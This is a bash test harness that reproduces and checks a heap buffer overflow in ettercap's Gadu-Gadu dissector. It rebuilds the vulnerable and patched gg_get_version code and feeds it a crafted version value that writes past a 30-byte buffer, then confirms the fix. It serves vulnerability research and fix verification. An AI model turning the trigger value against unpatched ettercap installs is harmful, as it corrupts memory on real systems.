#!/usr/bin/env bash
# ettercapgg2shell canonical runner.
# Rebuilds the verbatim gg_get_version body from two pinned upstream tags and
# drives an attacker-chosen u_int32 version through the exact dissector
# allocation. No network, packet capture, socket or external target is used.
set -u
cd "$(dirname "$0")" || exit 1
BASE=$PWD
PASS=0
FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
sha() { sha256sum "$1" | cut -d' ' -f1; }

pin() {
    if [ "$(sha "$2")" = "$3" ]; then ok "PIN $1"; else
        printf 'PIN_FAIL %s expected %s got %s\n' "$1" "$3" "$(sha "$2")"
        exit 1
    fi
}

pin tar-v0.8.4.1 src/v0.8.4.1.tar.gz f8fbcf0b0c7091559f1c772f742224c748259dda19cadc5225877cebaef28fff
pin tar-v0.8.5.1 src/v0.8.5.1.tar.gz f63182623b5ca85754c87c4bf5da681836fbc741c56c017818d8c8fec228c273
pin fix-pr1330 src/fix-1330.patch  4ab380d9fa46bde9052542f76e1fd70c13889da63bda1729fbe965916d58ee5c
pin driver poc.c                   f839ae7183a2494cbdafcc56e1ee1f01b81cbf82674c61eeadcce5f50fb65e67

rm -rf src/v0.8.4.1 src/v0.8.5.1
mkdir -p src/v0.8.4.1 src/v0.8.5.1
tar -xzf src/v0.8.4.1.tar.gz -C src/v0.8.4.1 --strip-components=1
tar -xzf src/v0.8.5.1.tar.gz -C src/v0.8.5.1 --strip-components=1

VULN_FILE=src/v0.8.4.1/src/dissectors/ec_gg.c
FIX_FILE=src/v0.8.5.1/src/dissectors/ec_gg.c
VULN_START=$(grep -n '^void gg_get_version(u_int32 version, char \*str)  {' "$VULN_FILE" | cut -d: -f1)
FIX_START=$(grep -n '^void gg_get_version(u_int32 version, char \*str, size_t size)  {' "$FIX_FILE" | cut -d: -f1)
if [ "$VULN_START" != 599 ] || [ "$FIX_START" != 631 ]; then
    printf 'PIN_FAIL function start lines %s/%s (expected 599/631)\n' "$VULN_START" "$FIX_START"
    exit 1
fi
ok 'PIN vulnerable function starts at verbatim ec_gg.c:599'
ok 'PIN fixed function starts at verbatim ec_gg.c:631'

printf '#line 599 "src/dissectors/ec_gg.c"\n' > src/gg_ver_vuln.inc
sed -n '599,678p' "$VULN_FILE" >> src/gg_ver_vuln.inc
printf '#line 631 "src/dissectors/ec_gg.c"\n' > src/gg_ver_fixed.inc
sed -n '631,717p' "$FIX_FILE" >> src/gg_ver_fixed.inc
pin vulnerable-body src/gg_ver_vuln.inc bef7c986fe4beb24df4a99ba13040cf46246cbb653439f22a160d8710def0cbf
pin fixed-body      src/gg_ver_fixed.inc 9ec393ab324ed43cd6a3a7e68f761139a84400abc00fc8e49dcca4f48dae3508
if grep -q 'GHSA-vrjv-f8gv-2h35' src/gg_ver_fixed.inc && grep -q 'snprintf(str, size' src/gg_ver_fixed.inc; then
    ok 'PIN fixed hunk carries GHSA marker and snprintf(str, size'
else bad 'fixed hunk marker'; fi
if grep -q 'SAFE_CALLOC(tbuf3, 30, sizeof(char))' "$VULN_FILE"; then
    ok 'PIN vulnerable tbuf3 allocation is 30 bytes'
else bad 'vulnerable allocation marker'; fi
if grep -q 'SAFE_CALLOC(tbuf3, GG_TBUF3_SIZE, sizeof(char))' "$FIX_FILE" && grep -q '#define GG_TBUF3_SIZE      64' "$FIX_FILE"; then
    ok 'PIN fixed tbuf3 allocation is 64 bytes'
else bad 'fixed allocation marker'; fi

OUT=src/out
rm -rf "$OUT"; mkdir -p "$OUT"
for CC in gcc clang; do
    $CC -std=gnu99 -O0 -g -fsanitize=address -fno-omit-frame-pointer -DASAN_BUILD \
        -Isrc poc.c -o "$OUT/vuln-$CC-asan" || { bad "build vuln $CC asan"; continue; }
    $CC -std=gnu99 -O0 -g -fsanitize=address -fno-omit-frame-pointer -DASAN_BUILD -DFIXED_BUILD \
        -Isrc poc.c -o "$OUT/fixed-$CC-asan" || { bad "build fixed $CC asan"; continue; }
    $CC -std=gnu99 -O0 -g -Isrc poc.c -o "$OUT/vuln-$CC-plain" || { bad "build vuln $CC plain"; continue; }
    $CC -std=gnu99 -O0 -g -DFIXED_BUILD -Isrc poc.c -o "$OUT/fixed-$CC-plain" || { bad "build fixed $CC plain"; continue; }
done

ATTACK=0x44000042   # default sprintf case + both flag strcats = 43 chars + NUL
SAFE=0x0000002a     # "7.7", no flags = 3 chars + NUL

asan_expect_write() {
    bin=$1; tag=$2
    log="evidence/$tag.log"
    "$bin" "$ATTACK" >"$log" 2>&1
    if grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$log" \
       && grep -q 'WRITE of size' "$log" \
       && grep -q 'ec_gg.c:673' "$log" \
       && grep -q '30-byte region' "$log"; then ok "$tag: ASan WRITE-overflow at verbatim ec_gg.c:673"; else bad "$tag: expected ASan WRITE"; fi
}
asan_expect_clean() {
    bin=$1; ver=$2; tag=$3
    log="evidence/$tag.log"
    "$bin" "$ver" >"$log" 2>&1
    if ! grep -q 'AddressSanitizer' "$log"; then ok "$tag: no ASan report"; else bad "$tag: unexpected ASan"; fi
}
plain_expect() {
    bin=$1; ver=$2; tag=$3; mode=$4
    log="evidence/$tag.log"
    "$bin" "$ver" >"$log" 2>&1
    if [ "$mode" = attack ]; then
        if grep -q '^b11=34$' "$log" && grep -q '^b30=69$' "$log" && grep -q '^b42=78$' "$log"; then
            ok "$tag: chosen hex digit in bounds; suffix bytes past offset 30"
        else bad "$tag: expected chosen digit and OOB suffix"; fi
    else
        if grep -q '^b30=00$' "$log" && grep -q '^b35=00$' "$log"; then
            ok "$tag: no bytes past offset 30 on safe version"
        else bad "$tag: safe input wrote past offset 30"; fi
    fi
}
fixed_expect_len() {
    bin=$1; tag=$2; want=$3
    log="evidence/$tag.log"
    "$bin" "$ATTACK" >"$log" 2>&1
    if grep -q "^len=$want\$" "$log" && ! grep -q 'AddressSanitizer' "$log"; then
        ok "$tag: fixed helper bounds output to $want chars"
    else bad "$tag: fixed length/clean"; fi
}

for CC in gcc clang; do
    asan_expect_write "$OUT/vuln-$CC-asan" "vuln-$CC-asan-attack"
    asan_expect_clean "$OUT/vuln-$CC-asan" "$SAFE" "vuln-$CC-asan-safe"
    fixed_expect_len "$OUT/fixed-$CC-asan" "fixed-$CC-asan-attack" 29
    asan_expect_clean "$OUT/fixed-$CC-asan" "$SAFE" "fixed-$CC-asan-safe"
    plain_expect "$OUT/vuln-$CC-plain" "$ATTACK" "vuln-$CC-plain-attack" attack
    plain_expect "$OUT/vuln-$CC-plain" "$SAFE" "vuln-$CC-plain-safe" safe
    fixed_expect_len "$OUT/fixed-$CC-plain" "fixed-$CC-plain-attack" 29
done

printf 'RESULT PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
